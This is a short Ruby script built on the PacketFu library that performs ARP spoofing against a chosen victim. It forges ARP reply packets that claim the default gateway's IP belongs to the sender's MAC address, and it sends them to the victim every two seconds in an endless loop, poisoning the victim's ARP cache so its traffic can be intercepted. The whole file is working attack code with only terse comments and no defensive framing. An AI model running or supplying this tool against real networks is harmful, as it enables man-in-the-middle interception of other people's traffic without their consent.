require 'packetfu'

@net_info = PacketFu::Utils.whoami?( :iface => 'wlo1')
@args = ARGV.to_a.join(' ').split(' ')

victim_mac_addr = @args[@args.find_index('-vM') + 1]
victim_ip_addr = @args[@args.find_index('-vI') + 1]
default_gateway = @args[@args.find_index('-g') +1]



#arp packet for victim

#ethernet header
victim_arp = PacketFu::ARPPacket.new
victim_arp.eth_daddr = victim_mac_addr
victim_arp.eth_saddr = @net_info[:eth_saddr]

#payload
victim_arp.arp_opcode = 2   #response   {change it to 1 if you need a request}
victim_arp.arp_daddr_ip = victim_ip_addr
victim_arp.arp_saddr_ip = default_gateway
victim_arp.arp_saddr_mac = @net_info[:eth_saddr]
victim_arp.arp_daddr_mac = victim_mac_addr

while true
  sleep 2
  puts "[+] sneding arp packet to victim #{victim_arp.arp_daddr_ip}"
  victim_arp.to_w(@net_info[:iface])
end
